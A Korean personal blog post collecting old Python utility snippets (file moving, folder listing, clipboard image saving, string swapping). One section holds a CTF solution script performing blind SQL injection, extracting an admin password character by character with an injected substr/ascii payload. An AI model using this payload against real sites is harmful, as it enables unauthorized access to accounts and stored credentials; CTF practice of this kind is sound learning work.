---
title: 파이썬 코드 뭉치 - 1
author: Hve
date: 2023-01-18 12:14:00 +0900
categories: [Dev, Python]
math: false
mermaid: false
tags: [python]
---

옛날에 만든 파이썬 코드뭉치들

## 파일 이동

```python
import shutil
import os

scr = 'C:\\Users\\UserName\\Desktop\\'
dir = 'C:\\Resource\\Picture\\Screenshot\\Hearthstone\\'

path = scr + "./"
file_list = os.listdir(path)

for fn in file_list:
    if 'Hearthstone Screenshot' in fn:
        print("moved " + fn);
        shutil.move(scr + fn, dir + fn);

path=os.path.realpath(dir)
os.startfile(path)
```

하스스톤에서 스크린샷을 찍으면 무조건 바탕화면에 저장되는걸 옮기기 위한 코드

마지막 수정: 20.11.27

## SQL Injection 공격

```python
import httplib
conn = httplib.HTTPSConnection("주소")
headers = {"Content-Type":"application/x-www-form-urlencoded",'Cookie':'PHPSESSID=SESSIONID12345'

flag = ''
for i in range(1,20):
        for j in range(32,127):
            conn.request("GET","/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw='%20or%20id='admin'%20and%20ascii(substr(pw,"+str(i)+",1))="+str(j)+"%20%23","",headers)
            r1 = conn.getresponse()
            k = r1.read()
            if 'Hello admin' in k:
                flag += chr(j)
                print flag
                break

print "done"
```

CTF 문제풀이용 코드. python 2로 짠것 같다.

마지막 수정: 19.11.18


## 폴더내 요소 출력

```python
import shutil
import os

def find(path):
    if "C:\\" in path:
        scr = path
    else:
        scr = os.getcwd() + path

    file_list = os.listdir(scr)
    return file_list;
```

마지막 수정: 21.09.05

## 클립보드 이미지 저장

```python
from PIL import ImageGrab
import os
'''
클립보드 이미지 저장
'''

from pynput.keyboard import Listener, Key, KeyCode

def save_clipboard():
    fname = "clipboard_{}.png"

    i = 0;
    while(os.path.exists(fname.format(i))):
        i += 1
    try:
        img = ImageGrab.grabclipboard()
        img.save(fname.format(i), 'PNG')
        print('save at', fname.format(i))
    except TclError as e:
        print('invalid clipboard')

store = set()
 
HOT_KEYS = {
    'save_clipboard': set([ Key.alt_l, KeyCode(char='1')] )
}

 
def handleKeyPress( key, **kwargs ):
    store.add( key )
 
def handleKeyRelease( key ):
    for action, trigger in HOT_KEYS.items():
        CHECK = all([ True if triggerKey in store else False for triggerKey in trigger ])
 
        if CHECK:
            try:
                action = eval( action )
                if callable( action ):
                    action()
            except NameError as err:
                print( err )
                
    # 종료
    if key == Key.esc:
        return False
    elif key in store:
        store.remove( key )

print('Press alt+1 to save clipboard image')

with Listener(on_press=handleKeyPress, on_release=handleKeyRelease) as listener:
    listener.join()
```

마지막 수정: 20.10.07

## 문자열 위치 변경
```python
def swap(s):
    i = s.find('=');
    if i == -1:
        return -1;
    s1 = s[i+1:].replace('\t','')
    s2 = s[0:i].replace('\t','')
    while(s1[-1] == ';'):
        s1 = s1[:-1]
    while(s1[0] == ' '):
        s1 = s1[1:]
    while(s1[0] == '\t'):
        s1 = s1[1:]
    while(s1[-1] == ' '):
        s1 = s1[:-1]
    while(s2[0] == ' '):
        s2 = s2[1:]
    while(s2[-1] == ' '):
        s2 = s2[:-1]
    n = s1 + ' = ' + s2 + ";"
    print(n);
```

코드는 개판이지만 대충 `a = b;` 를 `b = a;` 로 바꾸는 것 같다.

마지막 수정: 21.11.13